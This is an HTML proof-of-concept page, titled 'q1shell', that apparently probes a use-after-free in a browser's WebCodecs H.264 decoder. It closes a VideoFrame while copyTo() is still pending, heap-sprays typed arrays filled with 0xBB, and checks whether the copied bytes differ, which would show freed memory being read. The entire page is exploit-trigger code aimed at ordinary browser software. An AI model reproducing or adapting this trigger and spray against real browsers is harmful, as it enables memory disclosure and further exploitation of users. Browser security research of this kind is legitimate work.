<!doctype html>
<html>
<head><title>q1shell</title></head>
<body style="background:#000;color:#0f0;font-family:monospace;font-size:12px;padding:20px;">
<div id="out"></div>
<script>
const log = s => { out.innerHTML += s + '<br>'; console.log(s); };

log('H264 software decoded VideoFrame UAF test');
log('');

const H264_FRAME = new Uint8Array([
    0x00, 0x00, 0x00, 0x01, 0x67, 0x42, 0xc0, 0x1e, 0xd9, 0x1e, 0xc0, 0x44,
    0x00, 0x00, 0x03, 0x00, 0x04, 0x00, 0x00, 0x03, 0x00, 0x08, 0x3c, 0x58, 0xb9, 0x20,
    0x00, 0x00, 0x00, 0x01, 0x68, 0xcb, 0x83, 0xcb, 0x20,
    0x00, 0x00, 0x01, 0x65, 0x88, 0x84, 0x05, 0x7f, 0xff, 0xff, 0x0f, 0x45, 0x00, 0x01, 0x42, 0xdf, 0x80
]);

const AVCC = new Uint8Array([
    0x01, 0x42, 0xc0, 0x1e, 0xff, 0xe1,
    0x00, 0x16,
    0x67, 0x42, 0xc0, 0x1e, 0xd9, 0x1e, 0xc0, 0x44,
    0x00, 0x00, 0x03, 0x00, 0x04, 0x00, 0x00, 0x03, 0x00, 0x08, 0x3c, 0x58, 0xb9, 0x20,
    0x01, 0x00, 0x05,
    0x68, 0xcb, 0x83, 0xcb, 0x20
]);

// Get baseline from normal copyTo (no close)
async function getBaseline(frame) {
    const buf = new Uint8Array(frame.allocationSize());
    await frame.copyTo(buf);
    frame.close();
    return buf;
}

let frameCount = 0;
let baseline = null;

const decoder = new VideoDecoder({
    output: async (frame) => {
        frameCount++;
        log('[frame ' + frameCount + '] format=' + frame.format +
            ' size=' + frame.codedWidth + 'x' + frame.codedHeight);

        if (frameCount === 1) {
            // First frame: get baseline
            baseline = await getBaseline(frame);
            const hex = Array.from(baseline.slice(0, 8))
                .map(x => x.toString(16).padStart(2,'0')).join(' ');
            log('[baseline] ' + hex + ' size=' + baseline.length);
            return;
        }

        // Subsequent frames: UAF test
        const buf = new Uint8Array(frame.allocationSize());
        const p = frame.copyTo(buf);
        frame.close();

        // Spray after close
        const spray = [];
        for (let i = 0; i < 500; i++) {
            spray.push(new Uint8Array(64).fill(0xBB));
            spray.push(new Uint8Array(128).fill(0xBB));
        }

        try {
            await p;
            spray.length = 0;
            const hex = Array.from(buf.slice(0, 8))
                .map(x => x.toString(16).padStart(2,'0')).join(' ');
            const differs = baseline && buf.some((b, i) => b !== baseline[i]);
            log('[UAF #' + (frameCount-1) + '] ' + hex +
                (differs ? ' <<< DIFFERS' : ' (same as baseline)'));
        } catch(e) {
            spray.length = 0;
            log('[UAF #' + (frameCount-1) + '] threw: ' + e.message);
        }
    },
    error: (e) => log('[error] ' + e.message),
});

decoder.configure({
    codec: 'avc1.42c01e',
    codedWidth: 16,
    codedHeight: 16,
    description: AVCC,
    hardwareAcceleration: 'prefer-software',
});

// Decode multiple frames
for (let i = 0; i < 6; i++) {
    decoder.decode(new EncodedVideoChunk({
        type: 'key',
        timestamp: i * 33333,
        data: H264_FRAME,
    }));
}

decoder.flush().then(() => log('done. frames=' + frameCount))
               .catch(e => log('flush: ' + e));
</script>
</body>
</html>
